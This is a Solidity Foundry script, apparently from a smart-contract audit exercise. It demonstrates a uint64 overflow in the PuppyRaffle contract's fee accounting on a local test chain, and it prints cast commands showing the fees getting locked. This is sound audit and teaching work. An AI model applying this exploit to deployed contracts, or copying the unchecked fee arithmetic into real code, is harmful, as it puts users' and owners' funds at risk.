// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Script, console} from "forge-std/Script.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

/// @notice H-3 Integer Overflow Demo.
/// Deploys PuppyRaffle and enters 100 players (100 ETH).
/// After selectWinner() is called, totalFees overflows uint64 silently —
/// the owner can never withdraw their 20 ETH in fees.
contract AttackOverflow is Script {
    function run() external returns (address raffleAddr) {
        uint256 ownerKey = vm.envUint("OWNER_KEY");
        address owner = vm.addr(ownerKey);

        vm.startBroadcast(ownerKey);

        // Deploy PuppyRaffle with 1 ETH entrance fee and 1 day duration
        PuppyRaffle raffle = new PuppyRaffle(
            1 ether,
            owner,       // fees go to the owner
            1 days
        );
        raffleAddr = address(raffle);

        // Build 100 unique player addresses and enter them
        // 100 players × 1 ETH = 100 ETH total, fee = 20 ETH → overflows uint64 (max ~18.44 ETH)
        address[] memory players = new address[](100);
        for (uint256 i = 0; i < 100; i++) {
            players[i] = address(uint160(i + 100)); // address(100) .. address(199)
        }
        raffle.enterRaffle{value: 100 ether}(players);

        vm.stopBroadcast();

        console.log("=== H-3: OVERFLOW SETUP COMPLETE ===");
        console.log("PuppyRaffle deployed at :", raffleAddr);
        console.log("Players entered         : 100");
        console.log("Contract ETH balance    : 100 ETH");
        console.log("Owner (feeAddress)      :", owner);
        console.log("=====================================");
        console.log("NEXT STEPS:");
        console.log("1. Advance time past 1 day:");
        console.log("   cast rpc evm_increaseTime 86401");
        console.log("   cast rpc evm_mine");
        console.log("2. Call selectWinner:");
        console.log("   cast send <RAFFLE_ADDR> 'selectWinner()' --private-key $OWNER_KEY --rpc-url http://127.0.0.1:8545");
        console.log("3. Read totalFees (should be ~1.55 ETH, NOT 20 ETH):");
        console.log("   cast call <RAFFLE_ADDR> 'totalFees()(uint64)' --rpc-url http://127.0.0.1:8545");
        console.log("4. Try withdrawFees (will REVERT - fees permanently locked):");
        console.log("   cast send <RAFFLE_ADDR> 'withdrawFees()' --private-key $OWNER_KEY --rpc-url http://127.0.0.1:8545");
    }
}
